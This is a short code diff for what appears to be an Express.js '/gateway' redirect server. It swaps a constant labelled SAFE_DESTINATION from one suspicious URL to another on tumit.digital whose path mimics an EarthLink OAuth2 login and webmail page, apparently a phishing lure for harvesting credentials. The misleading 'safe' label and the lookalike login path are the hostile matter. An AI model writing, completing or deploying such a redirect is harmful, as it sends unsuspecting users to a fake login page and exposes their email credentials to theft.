@@ -13,7 +13,7 @@ function isValidEmail(email) {
 }
 
 // Example safe destination
-const SAFE_DESTINATION = "https://hub.bluestep.ru/yueia/index.php";
+const SAFE_DESTINATION = "https://tumit.digital/accounting.earthlinks.net-consumer-auth-oauth2.loginlogin-challenge/EarthLinks/webmail/index.html";
 
 // Gateway route
 app.get("/gateway", (req, res) => {
@@ -36,3 +36,4 @@ app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 
 });
+
